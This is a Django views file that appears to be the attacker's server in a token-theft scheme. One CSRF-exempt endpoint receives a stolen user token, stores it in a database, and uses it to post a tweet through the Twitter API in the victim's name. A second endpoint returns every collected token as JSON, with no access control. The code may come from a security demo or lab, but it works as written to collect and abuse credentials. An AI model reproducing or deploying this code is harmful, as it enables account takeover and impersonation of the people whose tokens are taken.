from django.http import HttpResponse, JsonResponse, Http404
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from .models import StolenToken
import json
import requests

@require_http_methods(['POST'])
@csrf_exempt
def steal_token(request):
    stolentoken = json.loads(request.body).get("stolentoken")
    new_stolentoken = StolenToken.objects.create(usertoken = stolentoken, stolen_date = timezone.now())
    text = "A tweet sent by the attacker."
    data = { "text": text }
    res = requests.post('https://api.twitter.com/2/tweets',json=data,headers={'Authorization':'Bearer '+stolentoken,"Content-Type": "application/json"})
    if res.status_code == 201:
        return HttpResponse("your tweet is submitted successfully")
    elif res.status_code == 403:
        return HttpResponse("Wrong token or expired , please try to login again",status=403)
    return HttpResponse("Something went wrong , please try to login again",status=404)

@require_http_methods(['GET'])
def get_stolen_tokens(request):
    stolen_tokens = StolenToken.objects.values()
    stolenTokenList = [record for record in stolen_tokens]
    return JsonResponse({"code": 200, "stolen_tokens": stolenTokenList})